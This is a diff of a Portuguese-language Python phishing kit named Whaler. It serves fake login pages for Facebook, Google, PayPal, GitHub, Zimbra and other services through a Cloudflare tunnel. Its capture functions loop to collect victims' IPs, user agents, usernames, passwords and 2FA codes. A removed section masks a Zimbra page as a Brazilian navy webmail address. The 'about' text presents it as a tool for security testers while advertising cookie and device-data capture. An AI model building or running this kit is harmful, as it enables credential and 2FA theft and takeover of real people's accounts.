@@ -1,21 +1,17 @@
 #!/usr/bin/env python3
+version = '1.3.0'
 
-######################
-## VERSÃO DO WHALER ##
-######################
-version = '1.3dev'
-
-############################
-## IMPORTA AS BIBLIOTECAS ##
-############################
+###############################
+## IMPORTAÇÃO DE BIBLIOTECAS ##
+###############################
 import os
 import re
 import signal
 import time as t
 
-#########################
-## DEFAULT HOST ##
-#########################
+########################
+## ## DEFAULT HOST ## ##
+########################
 HOST = '127.0.0.1'
 PORTA = 8080
 BASE_DIR= os.popen('pwd').read()
@@ -26,26 +22,36 @@ NULL = '> /dev/null 2>&1'
 #########################################
 def handler(signum, frame):
         global pool
-
         try:
             pool.terminate()
-
         except Exception as e:
             print('')
             pass
-
         except KeyboardInterrupt:
             PID = os.popen("pgrep -f 'php -S'").read()
-
             if PID:
                 os.system(f'kill {PID}')
             print('')
             pass
-        
         finally:
             exit(0)
 
 signal.signal(signal.SIGINT, handler)
+
+#########################################
+## VERIFICA DEPENDENCIAS (PHP E UNZIP) ##
+#########################################
+print('Verificando dependencias:')
+
+if os.system(f'which php {NULL}') == 0:
+    print(' - PHP Instalado')
+else:
+    os.system('sudo apt install php')
+
+if os.system(f'which unzip {NULL}') == 0:
+    print(' - UNZIP Instalado')
+else:
+    os.system('sudo apt install unzip')
 
 ##############################
 ## CRIA O DIRETÓRIO .SERVER ##
@@ -98,26 +104,14 @@ for process in PID:
     except Exception as e:
         continue
 
-#########################################
-## VERIFICA DEPENDENCIAS (PHP E UNZIP) ##
-#########################################
-print('Verificando dependencias:')
-if os.system(f'which php {NULL}') == 0:
-    print(' - PHP Instalado')
-else:
-    os.system('sudo apt install php')
-if os.system(f'which unzip {NULL}') == 0:
-    print(' - UNZIP Instalado')
-else:
-    os.system('sudo apt install unzip')
-
 ###################################
 ## VERIFICA SITUAÇAO DA INTERNET ##
 ###################################
 if os.system(f'ping -c 1 -w 5 www.google.com {NULL}') == 0:
+
     print('Status da Internet: Online')
     print('Verificando Atualizações: ')
-    relase_url='https://api.github.com/repos/maarckz/whaler/releases/latest'
+    relase_url='https://api.github.com/repos/maarckz/essex/releases/latest'
     #LOGICA
     '''
     VERIFICA A VERSAO
@@ -154,6 +148,7 @@ def banner():
 def install_cloudflared():
     if os.path.exists(".server/cloudflared"):
         print("\nCloudflared está instalado.")
+
     else:
         print("Instalando Cloudflared...")
         arch = os.uname().machine
@@ -162,33 +157,49 @@ def install_cloudflared():
         if 'x86_64' in arch:
             url = 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
 
+        ##############################
+        ## Cria o diretório .server ##
+        ##############################
         os.makedirs(".server", exist_ok=True)
 
+        #########################
+        ## Baixa o CloudFlared ##
+        #########################
         command = f"wget -q -O .server/cloudflared {url}"
         result = os.system(command)
         os.system('chmod +x .server/cloudflared')
+
+        ###################################
+        ## Mensagem de Conclusão ou Erro ##
+        ###################################
         if result == 0:
             print(f"Download do CloudFlared feito com sucesso!")
         else:
             print(f"Erro ao baixar CloudFlared!")
 
 ##################################
-## FUNÇAÃO PARA ALTERAR A PORTA ##
+## FUNÇÃO PARA ALTERAR A PORTA ##
 ##################################
 def alterar_porta():
     try:
         sit_port = input('\nPorta padrão é \033[7;32m8080\033[m. Deseja alterar a porta? (s/N) ')
+
         if sit_port.lower() == 's':
             PORT = int(input('Digite a Porta: '))
             if PORT:
                 return PORT
-            
+
+        #######################################
+        ## CASO A RESPOSTA SEJA "N" OU VAZIA ##
+        #######################################  
         elif sit_port.lower() == 'n':
             PORT = PORTA
             return PORT
+
         elif sit_port.lower() != 's' or 'n':
             PORT = PORTA
             return PORT
+
     except UnboundLocalError:
         PORT = PORTA
         return PORT
@@ -215,6 +226,18 @@ def capture_ip():
 ####################################
 ## FUNÇÃO QUE CAPTURA CREDENCIAIS ##
 ####################################
+def capture_useragent():
+    DATA = os.popen("cat .server/www/useragent.txt").read()
+    DATA = DATA.split(',')
+    print('Dados:')
+    for dados in DATA:
+        print(f'\033[1;33m{dados}\033[m')
+    print('Dados salvos em auth/ips.txt')
+    os.system('cat .server/www/useragent.txt >> auth/ip.txt')
+
+####################################
+## FUNÇÃO QUE CAPTURA CREDENCIAIS ##
+####################################
 def capture_creds():
     LOGIN = os.popen("grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}'").read()
     LOGIN = LOGIN.split('\n')
@@ -235,6 +258,7 @@ def capture_2fa():
     print('Credenciais salvas em auth/usernames.dat')
     os.system('cat .server/www/2fa.txt >> auth/usernames.dat')
 
+
 ###########################################
 ## IMPRIME E CAPTURA OS DADOS CAPTURADOS ##
 ###########################################
@@ -242,6 +266,10 @@ def capture_data():
     print("\n\033[1;30mAguardando Login, pressione Ctrl + C para sair.\033[m")
 
     while True:
+
+        ################
+        ## CAPTURA IP ##
+        ################
         if os.path.exists(".server/www/ip.txt"):
             print("\nVitima Capturada!")
             capture_ip()
@@ -249,6 +277,19 @@ def capture_data():
         
         t.sleep(0.75)
         
+        #######################
+        ## CAPTURA USERAGENT ##
+        #######################
+        if os.path.exists(".server/www/useragent.txt"):
+            print("\n\033[mDados Capturados!\033[m")
+            capture_useragent()
+            os.remove(".server/www/useragent.txt")
+        
+        t.sleep(0.75)
+        
+        ###################
+        ## CAPTURA LOGIN ##
+        ###################
         if os.path.exists(".server/www/usernames.txt"):
             print("\n\033[mLogin Capturado!\033[m")
             capture_creds()
@@ -256,54 +297,15 @@ def capture_data():
         
         t.sleep(0.75)
 
+        #################
+        ## CAPTURA 2FA ##
+        #################
         if os.path.exists(".server/www/2fa.txt"):
             print("\n\033[m2FA Capturado!\033[m")
             capture_2fa()
             os.remove(".server/www/2fa.txt")
         
         t.sleep(0.75)
-
-####################################
-## INICIA O SERVIDOR EM LOCALHOST ##
-####################################
-def start_localhost(SITE):
-    os.system('clear')
-    banner()
-    PORT = alterar_porta()
-    config_site(SITE,HOST,PORT)
-    t.sleep(1)
-    print(f"\nServidor iniciado em \033[7;32mhttp://{HOST}:{PORT} \033[m")
-    capture_data()
-
-######################################
-## INICIA O SERVIDOR EM CLOUDFLARED ##
-######################################
-def start_cloudflared(SITE):
-    os.system('clear')
-    banner()
-    # Remove o arquivo de log, se existir
-    if os.path.exists('.cld.log'):
-        os.remove('.cld.log')
-
-    PORT = alterar_porta()
-    config_site(SITE,HOST,PORT)
-
-    print("\nIniciando Cloudflared...")
-
-    cmd = (f"./.server/cloudflared tunnel -url {HOST}:{PORT} --logfile .server/.cld.log")
-    os.system(f'{cmd} > /dev/null 2>&1 &')
-    t.sleep(8)
-
-    # Lê o arquivo de log e extrai a URL
-    cldflr_url = ''
-    with open('.server/.cld.log', 'r') as file:
-        log_content = file.read()
-        match = re.search(r'https://[-0-9a-z]*\.trycloudflare.com', log_content)
-        if match:
-            cldflr_url = match.group(0)
-            
-    print(f'Servidor Cloudflared iniciado em \033[7;32m{cldflr_url}\033[m')
-    capture_data()
 
 
 ###################################################
@@ -318,42 +320,67 @@ def tunnel_menu(SITE):
 
     if reply in ('1'):
         start_localhost(SITE)
+
     elif reply in ('2'):
         start_cloudflared(SITE)
+
     else:
         print("\nOpção invalida.")
         t.sleep(1)
         tunnel_menu(SITE)
 
-######################
-## PAGINA DO ZIMBRA ##
-######################
-def zimbra():
+####################################
+## INICIA O SERVIDOR EM LOCALHOST ##
+####################################
+def start_localhost(SITE):
     os.system('clear')
     banner()
-    print("""
-Pagina Selecionada: Zimbra Webmail
-         
- \033[0;34m[1]\033[m Página de Login
- [2] Em breve
-    """)
+    PORT = alterar_porta()
+    config_site(SITE,HOST,PORT)
+    t.sleep(1)
+    print(f"\nServidor iniciado em \033[7;32mhttp://{HOST}:{PORT} \033[m")
+    capture_data()
 
-    choice = input("\nSelecione a opção: ")
 
-    if choice in ["1"]:
-        website="zimbra"
-        mask='https://webmail.marinha.mil.br'
-        tunnel_menu(website)
-    elif choice in ["2"]:
-        website = "zimbra"
-        mask = 'https://vote-for-the-best-social-media'
-        tunnel_menu(website)
-    else:
-        print("\n[!] Invalid Option, Try Again...")
-        import time
-        time.sleep(1)
-        menu()
+######################################
+## INICIA O SERVIDOR EM CLOUDFLARED ##
+######################################
+def start_cloudflared(SITE):
+    os.system('clear')
+    banner()
 
+    #########################################
+    ## REMOVE O ARQUIVO DE LOG, SE EXISTIR ##
+    #########################################
+    if os.path.exists('.cld.log'):
+        os.remove('.cld.log')
+
+    PORT = alterar_porta()
+    config_site(SITE,HOST,PORT)
+
+    print("\nIniciando Cloudflared...")
+
+    cmd = (f"./.server/cloudflared tunnel -url {HOST}:{PORT} --logfile .server/.cld.log")
+    os.system(f'{cmd} > /dev/null 2>&1 &')
+    t.sleep(8)
+
+    ########################################
+    ## LÊ O ARQUIVO DE LOG E EXTRAI A URL ##
+    ########################################
+    cldflr_url = ''
+    with open('.server/.cld.log', 'r') as file:
+        log_content = file.read()
+        match = re.search(r'https://[-0-9a-z]*\.trycloudflare.com', log_content)
+
+        if match:
+            cldflr_url = match.group(0)
+            
+    print(f'Servidor Cloudflared iniciado em \033[7;32m{cldflr_url}\033[m')
+    capture_data()
+
+##############################################################
+## FUNÇÕES DAS PÁGINAS PODENDO SER ALTERADA CASO NECESSÁRIO ##
+##############################################################
 def facebook():#1
     website="facebook"
     tunnel_menu(website)
@@ -366,112 +393,59 @@ def google():#3
 def microsoft():#4
     website="microsoft"
     tunnel_menu(website)
-def netflix():#5
+def wordpress():#5
+    website="wordpress"
+    tunnel_menu(website)
+def linkedin():#6
+    website="linkedin"
+    tunnel_menu(website)
+def pinterest():#7
+    website="pinterest"
+    tunnel_menu(website)
+def netflix():#8
     website="netflix"
     tunnel_menu(website)
-def paypal():#6
+def paypal():#9
     website="paypal"
     tunnel_menu(website)
-def steam():#7
-    website="steam"
+def mercadolivre():#10
+    website="mercadolivre"
     tunnel_menu(website)
-def twitter():#8
-    website="twitter"
+def gitlab():#11
+    website="gitlab"
     tunnel_menu(website)
-    ####################################3
-def facebook():#
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#18
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#19
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#20
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#21
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#22
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#23
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#24
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#25
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#26
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#27
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#28
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#29
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#30
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#31
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#32
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#33
-    website="facebook"
-    tunnel_menu(website)
-def facebook():#34
-    website="facebook"
-    tunnel_menu(website)
-def github():#35
+def github():#12
     website="github"
     tunnel_menu(website)
-def zimbra():#36
+def zimbra():#13
     website="zimbra"
     tunnel_menu(website)
+def tiktok():#14
+    website="tiktok"
+    tunnel_menu(website)
+def discord():#15
+    website="discord"
+    tunnel_menu(website)
+
+
+
+## IMPLEMENTA
 def clonesite():#00
     site = input('Digite o Site a ser clonado (www.***.***): ')
     clone = f'wget --mirror --convert-links --adjust-extension --page-requisites https://{site}'
 def sobre():#99
     banner()
     print('''
+    Whaler é uma ferramenta desenvolvida em Python para a criação de páginas de phishing de diversos sites.
+Destinada a profissionais de segurança cibernética e entusiastas de hacking, Whaler é utilizada para realizar 
+testes de phishing de forma eficaz.
+
+    Este projeto é uma recriação aprimorada da ferramenta descontinuada ZPHISHER. Foram implementadas várias 
+funcionalidades adicionais para melhorar a captura de dados, incluindo a obtenção de informações como sessões 
+de cookies, autenticação de dois fatores (2FA), dados de localização, informações do dispositivo, sistema operacional, 
+processador e motor gráfico, entre outras.
+
+Estas melhorias visam fornecer uma ferramenta mais robusta e eficiente para testes de phishing.
           ''')
 
 ####################
@@ -482,65 +456,44 @@ def menu():
         os.system("clear")
         banner()
         print('''
-\033[0;34m[1]\033[m - Facebook     \033[0;34m[13]\033[m - Twitch       \033[0;34m[25]\033[m - DeviantArt
-\033[0;34m[2]\033[m - Instagram    \033[0;34m[14]\033[m - Pinterest    \033[0;34m[26]\033[m - Badoo
-\033[0;34m[3]\033[m - Google       \033[0;34m[15]\033[m - Snapchat     \033[0;34m[27]\033[m - Origin              
-\033[0;34m[4]\033[m - Microsoft    \033[0;34m[16]\033[m - Linkedin     \033[0;34m[28]\033[m - DropBox
-\033[0;34m[5]\033[m - Netflix      \033[0;34m[17]\033[m - Ebay         \033[0;34m[29]\033[m - Yahoo
-\033[0;34m[6]\033[m - Paypal       \033[0;34m[18]\033[m - Quora        \033[0;34m[30]\033[m - Wordpress
-\033[0;34m[7]\033[m - Steam        \033[0;34m[19]\033[m - Protonmail   \033[0;34m[31]\033[m - Yandex              
-\033[0;34m[8]\033[m - Twitter      \033[0;34m[20]\033[m - Spotify      \033[0;34m[32]\033[m - StackoverFlow
-\033[0;34m[9]\033[m - Playstation  \033[0;34m[21]\033[m - Reddit       \033[0;34m[33]\033[m - Vk
-\033[0;34m[10]\033[m- Tiktok       \033[0;34m[22]\033[m - Adobe        \033[0;34m[34]\033[m - XBOX
-\033[0;34m[11]\033[m- Mediafire    \033[0;34m[23]\033[m - Gitlab       \033[0;34m[35]\033[m - Github
-\033[0;34m[12]\033[m- Discord      \033[0;34m[24]\033[m - Roblox       \033[0;34m[36]\033[m - Zimbra
+\033[0;34m[1]\033[m - Facebook     \033[0;34m[2]\033[m - Instagram     \033[0;34m[3]\033[m - Google          
+\033[0;34m[4]\033[m - Microsoft    \033[0;34m[5]\033[m - Wordpress     \033[0;34m[6]\033[m - Linkedin
+\033[0;34m[7]\033[m - Pinterest    \033[0;34m[8]\033[m - Netflix       \033[0;34m[9]\033[m - Paypal 
+\033[0;34m[10]\033[m- MercadoLivre \033[0;34m[11]\033[m- GitLab        \033[0;34m[12]\033[m- Github  
+\033[0;34m[13]\033[m- Zimbra       \033[0;34m[14]\033[m- TikTok        \033[0;34m[15]\033[m- Discord
 
-\033[0;34m[00]\033[m - CloneSite    \033[0;34m[99]\033[m - Sobre
+\033[0;34m[00]\033[m - CloneSite   \033[0;34m[99]\033[m - Sobre
         ''')
 
         options = {
+            
+        ################################
+        ## CHAMA AS FUNÇOES DOS SITES ##
+        ################################    
         1: facebook,
         2: instagram,
         3: google,
         4: microsoft,
-        5: netflix,
-        6: paypal,
-        7: steam,
-        8: twitter,
-        #9: playstation,
-        #10: tiktok,
-        #11: mediafire,
-        #12: discord,
-        #13: twitch,
-        #14: pinterest,
-        #15: snapchat,
-        #16: linkedin,
-        #17: ebay,
-        #18: quora,
-        #19: protonmail,
-        #20: spotify,
-        #21: reddit,
-        #22: adobe,
-        #23: gitlab,
-        #24: roblox,
-        25: zimbra,
-        26: zimbra,
-        27: zimbra,
-        28: zimbra,
-        29: zimbra,
-        30: zimbra,
-        31: zimbra,
-        32: zimbra,
-        33: zimbra,
-        34: zimbra,
-        35: github,
-        36: zimbra,
+        5: wordpress,
+        6: linkedin,
+        7: pinterest,
+        8: netflix,
+        9: paypal,
+        10: mercadolivre,
+        11: gitlab,
+        12: github,
+        13: zimbra,
+        14: tiktok,
+        15: discord,
         00: clonesite,
         99: sobre,
         
         0: lambda: print('Volte sempre!') or quit
         }
 
+        #############################################
+        ## INPUT PARA ESCOLHA DE UMA OPÇÃO DO MENU ##
+        #############################################
         opcao = int(input('Escolha uma opção: '))
         funcao = options.get(opcao)
 
